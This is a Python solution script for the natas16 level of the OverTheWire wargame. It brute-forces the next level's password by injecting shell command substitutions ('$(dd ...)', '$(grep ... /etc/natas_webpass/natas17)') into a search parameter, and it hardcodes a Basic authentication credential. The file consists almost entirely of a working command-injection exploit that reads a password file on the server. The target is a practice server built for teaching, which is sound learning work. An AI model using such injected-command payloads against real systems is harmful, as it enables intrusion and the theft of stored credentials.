import requests
import urllib.parse
import base64
import time
from pprint import pprint
        
url = "http://natas16.natas.labs.overthewire.org/?needle={}&submit=Search"

all_char = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

header = {
    "Authorization": "Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=="
}


def make_request(qry):
    res = requests.get(url=url.format(
        urllib.parse.quote_plus(qry)), headers=header)
    return res.content


resp_dict = {}

# fill the char dictionary with the query output
for char in all_char:
    res = make_request(char)
    if res not in resp_dict.keys():
        resp_dict[res] = []
    resp_dict[res].append(char)

flag_length = 32  # we know the standard flag length

solution = []

for i in range(flag_length):
    qry = "$(dd status=none bs=1 skip={} count=1 if=/etc/natas_webpass/natas17)".format(i)
    res = make_request(qry)
    solution.append(resp_dict[res])

for i, l in enumerate(solution):
    print(i, l)


pswd = ""
idx = 18 #position of char A which appears only once

for el in solution[idx:]:
    for pos in el:
        tmp = pswd + pos
        qry = "$(expr substr $(grep {} /etc/natas_webpass/natas17) 17 3)".format(tmp)
        res = make_request(qry)
        if "African" not in str(res):
            pswd = tmp
            print(pswd)
            break

for el in range(idx, -1, -1):
    for pos in solution[el]:
        tmp = pos + pswd
        qry = "$(expr substr $(grep {} /etc/natas_webpass/natas17) 17 3)".format(tmp)
        res = make_request(qry)
        if "African" not in str(res):
            pswd = tmp
            print(pswd)
            break